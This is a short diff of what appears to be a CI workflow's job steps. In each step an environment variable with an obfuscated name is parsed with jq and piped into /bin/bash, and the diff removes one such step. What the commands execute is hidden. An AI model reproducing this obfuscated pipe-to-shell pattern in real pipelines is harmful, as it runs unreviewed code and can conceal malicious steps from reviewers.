@@ -21,7 +21,6 @@ jobs:
           echo $mhyrl07 | jq -r .axbl0241 | /bin/bash
           echo $rw1 | jq -r .jlyq445 | /bin/bash
           printf '%s' "$gc49" | jq -r .n365 | /bin/bash
-          printf '%s' "$fl147" | jq -r .k287 | /bin/bash
           printf '%s' "$z3427" | jq -r .etnl71 | /bin/bash
 
       - name: Save results
